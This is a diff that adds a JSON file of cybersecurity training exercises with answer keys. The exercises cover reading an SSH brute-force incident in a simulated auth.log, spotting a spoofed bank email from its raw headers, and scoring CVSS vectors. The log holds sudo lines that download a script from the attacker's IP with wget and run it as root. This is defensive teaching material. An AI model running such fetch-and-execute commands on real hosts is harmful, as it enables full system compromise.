@@ -1,0 +1,154 @@
+[
+ {
+  "id": "log-detective",
+  "title": "Log detective",
+  "track": "SOC",
+  "minutes": 8,
+  "skill": "Reading Linux authentication logs, the bread and butter of SOC work",
+  "intro": "It's 9am. An alert says server web-01 had a burst of failed SSH logins overnight. Here's an extract of /var/log/auth.log. Your job: work out who attacked, whether they got in, and what to do. Use the filter box like grep to narrow down lines.",
+  "lesson": "soc",
+  "artifact": {
+   "kind": "log",
+   "name": "web-01:/var/log/auth.log",
+   "text": "Oct 12 01:58:02 web-01 sshd[1180]: Accepted publickey for sam from 192.0.2.10 port 50214 ssh2\nOct 12 01:58:02 web-01 sshd[1180]: pam_unix(sshd:session): session opened for user sam\nOct 12 02:03:44 web-01 CRON[1203]: pam_unix(cron:session): session opened for user root\nOct 12 02:05:10 web-01 sshd[1221]: Failed password for admin from 198.51.100.7 port 40112 ssh2\nOct 12 02:05:19 web-01 sshd[1221]: Failed password for admin from 198.51.100.7 port 40112 ssh2\nOct 12 02:05:31 web-01 sshd[1221]: Accepted password for admin from 198.51.100.7 port 40112 ssh2\nOct 12 02:11:03 web-01 sshd[1240]: Invalid user test from 198.51.100.200 port 33010\nOct 12 02:11:04 web-01 sshd[1241]: Invalid user oracle from 198.51.100.200 port 33012\nOct 12 02:11:05 web-01 sshd[1242]: Invalid user ubuntu from 198.51.100.200 port 33014\nOct 12 02:13:21 web-01 sshd[1250]: Failed password for root from 203.0.113.45 port 51001 ssh2\nOct 12 02:13:24 web-01 sshd[1250]: Failed password for root from 203.0.113.45 port 51001 ssh2\nOct 12 02:13:27 web-01 sshd[1250]: Failed password for root from 203.0.113.45 port 51001 ssh2\nOct 12 02:13:41 web-01 sshd[1255]: Failed password for invalid user admin1 from 203.0.113.45 port 51014 ssh2\nOct 12 02:13:44 web-01 sshd[1255]: Failed password for invalid user admin1 from 203.0.113.45 port 51014 ssh2\nOct 12 02:14:02 web-01 sshd[1261]: Failed password for invalid user postgres from 203.0.113.45 port 51030 ssh2\nOct 12 02:14:05 web-01 sshd[1261]: Failed password for invalid user postgres from 203.0.113.45 port 51030 ssh2\nOct 12 02:14:40 web-01 sshd[1270]: Failed password for www-data from 203.0.113.45 port 51044 ssh2\nOct 12 02:15:12 web-01 sshd[1274]: Failed password for backup from 203.0.113.45 port 51058 ssh2\nOct 12 02:15:15 web-01 sshd[1274]: Failed password for backup from 203.0.113.45 port 51058 ssh2\nOct 12 02:15:18 web-01 sshd[1274]: Failed password for backup from 203.0.113.45 port 51058 ssh2\nOct 12 02:16:30 web-01 sshd[1280]: Invalid user deploy from 198.51.100.200 port 33102\nOct 12 02:17:05 web-01 sshd[1285]: Failed password for backup from 203.0.113.45 port 51090 ssh2\nOct 12 02:17:08 web-01 sshd[1285]: Failed password for backup from 203.0.113.45 port 51090 ssh2\nOct 12 02:17:11 web-01 sshd[1285]: Failed password for backup from 203.0.113.45 port 51090 ssh2\nOct 12 02:18:20 web-01 sshd[1291]: Failed password for backup from 203.0.113.45 port 51111 ssh2\nOct 12 02:18:23 web-01 sshd[1291]: Failed password for backup from 203.0.113.45 port 51111 ssh2\nOct 12 02:19:44 web-01 sshd[1296]: Failed password for backup from 203.0.113.45 port 51122 ssh2\nOct 12 02:19:47 web-01 sshd[1296]: Accepted password for backup from 203.0.113.45 port 51122 ssh2\nOct 12 02:19:47 web-01 sshd[1296]: pam_unix(sshd:session): session opened for user backup\nOct 12 02:21:09 web-01 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh\nOct 12 02:21:15 web-01 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash x.sh\nOct 12 02:24:58 web-01 sshd[1296]: pam_unix(sshd:session): session closed for user backup\nOct 12 06:30:00 web-01 CRON[1402]: pam_unix(cron:session): session opened for user root\nOct 12 08:47:12 web-01 sshd[1450]: Accepted publickey for sam from 192.0.2.10 port 50388 ssh2"
+  },
+  "steps": [
+   {
+    "type": "text",
+    "q": "Which IP address made the most failed password attempts?",
+    "answers": [
+     "203.0.113.45"
+    ],
+    "hint": "Filter for \"Failed password\" and look at the address after \"from\".",
+    "explain": "203.0.113.45 tried root, admin1, postgres, www-data and backup: a classic brute-force pattern. In a real shell: grep \"Failed password\" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr"
+   },
+   {
+    "type": "text",
+    "q": "Which account did that IP eventually log in to?",
+    "answers": [
+     "backup"
+    ],
+    "hint": "Filter for \"Accepted\" and the attacker's IP.",
+    "explain": "After 9 failed attempts against backup, the password was guessed. Service accounts like backup often have weak, never-changed passwords."
+   },
+   {
+    "type": "text",
+    "q": "At what time did that successful login happen? (HH:MM:SS)",
+    "answers": [
+     "02:19:47"
+    ],
+    "hint": "It's on the \"Accepted password for backup\" line.",
+    "explain": "Times matter: they let you line up this log with firewall, EDR and other evidence to build the attack timeline."
+   },
+   {
+    "type": "choice",
+    "q": "Look at what happened after the login. How bad is this?",
+    "options": [
+     "Harmless, they only looked around",
+     "Serious: they used sudo to download and run a script as root",
+     "Can't tell from logs"
+    ],
+    "answer": 1,
+    "explain": "The sudo lines show backup running wget to fetch x.sh from the attacker's IP, then executing it as root. Assume full compromise of web-01."
+   },
+   {
+    "type": "choice",
+    "q": "What should you do first?",
+    "options": [
+     "Block 198.51.100.7, it failed twice",
+     "Disable the backup account, isolate web-01 from the network and preserve evidence",
+     "Delete auth.log to clean up",
+     "Wait to see if it happens again"
+    ],
+    "answer": 1,
+    "explain": "Contain first: stop the attacker's access and spread, but keep the evidence. 198.51.100.7 was just a user mistyping a password before logging in normally."
+   }
+  ]
+ },
+ {
+  "id": "header-inspector",
+  "title": "Header inspector",
+  "track": "Phishing",
+  "minutes": 6,
+  "skill": "Reading raw email headers to spot spoofing",
+  "intro": "Jordan forwarded a 'bank security alert' and asked if it's real. The email looks perfect, but the headers tell the true story. (In most email apps: More → Show original / View source.)",
+  "lesson": "phishing",
+  "artifact": {
+   "kind": "headers",
+   "name": "Message headers",
+   "text": "Return-Path: <bounce-7731@mail-x7-delivery.biz>\nReceived: from mail-x7-delivery.biz (mail-x7-delivery.biz [198.51.100.23])\n        by mx.halcyonlabs.com with ESMTP id 4f9a2c; Mon, 12 Oct 2026 08:41:07 +0000\nAuthentication-Results: mx.halcyonlabs.com;\n       spf=fail (sender IP is 198.51.100.23) smtp.mailfrom=mail-x7-delivery.biz;\n       dkim=none (message not signed);\n       dmarc=fail action=quarantine header.from=northvalebank.com\nFrom: \"Northvale Bank Security\" <security@northvalebank.com>\nReply-To: northvale-verify@quickmail.example\nTo: jordan@halcyonlabs.com\nSubject: Unusual sign-in detected - verify within 12 hours\nDate: Mon, 12 Oct 2026 08:41:02 +0000\nMessage-ID: <20261012084102.7731@mail-x7-delivery.biz>\nX-Mailer: MassMail Pro 4.2"
+  },
+  "steps": [
+   {
+    "type": "choice",
+    "q": "The From line says northvalebank.com. Which domain's server actually sent it?",
+    "options": [
+     "northvalebank.com",
+     "mail-x7-delivery.biz",
+     "halcyonlabs.com",
+     "quickmail.example"
+    ],
+    "answer": 1,
+    "explain": "The Received and Return-Path lines show mail-x7-delivery.biz. The From line is just text the sender typed, and it's trivial to fake."
+   },
+   {
+    "type": "choice",
+    "q": "What was the SPF result?",
+    "options": [
+     "pass",
+     "softfail",
+     "fail",
+     "none"
+    ],
+    "answer": 2,
+    "explain": "SPF checks whether the sending server is allowed to send for that domain. spf=fail means it isn't."
+   },
+   {
+    "type": "text",
+    "q": "If Jordan clicks Reply, which address does the reply go to?",
+    "answers": [
+     "northvale-verify@quickmail.example"
+    ],
+    "hint": "Look for the Reply-To header.",
+    "explain": "A Reply-To that differs from the From address is a classic trick: replies quietly go to the attacker."
+   },
+   {
+    "type": "choice",
+    "q": "DMARC failed with action=quarantine. What's your verdict?",
+    "options": [
+     "Legitimate bank alert",
+     "Spoofed phishing email: report it and don't click"
+    ],
+    "answer": 1,
+    "explain": "DMARC failing means the message didn't prove it came from northvalebank.com. Combined with urgency and a mismatched Reply-To, it's phishing."
+   }
+  ]
+ },
+ {
+  "id": "cvss-builder",
+  "title": "Score it: CVSS builder",
+  "track": "Vulnerability management",
+  "minutes": 10,
+  "skill": "Turning a bug description into a CVSS 3.1 severity score",
+  "intro": "Security teams describe every vulnerability with the same eight CVSS metrics. Read each scenario, pick the metrics, and watch the score update live. Match the official vector to pass.",
+  "lesson": "vuln-management",
+  "kind": "cvss",
+  "scenarios": [
+   {
+    "title": "VPN appliance takeover",
+    "text": "Anyone on the internet can send one crafted request to a company's VPN appliance and run commands as root. No login needed, nobody has to click anything, and it always works.",
+    "target": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+   },
+   {
+    "title": "Stored XSS in comments",
+    "text": "A logged-in user can post a comment containing script. When other users view it, the script runs in their browser on the site and can read or change some of their data. The vulnerable app and the victim's browser session are different security scopes.",
+    "target": "AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+   },
+   {
+    "title": "Local privilege escalation",
+    "text": "Someone who already has a normal user account on a Linux server can run a program that makes them root. They need to be logged in to the machine itself; no other user is involved.",
+    "target": "AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+   }
+  ]
+ }
+]
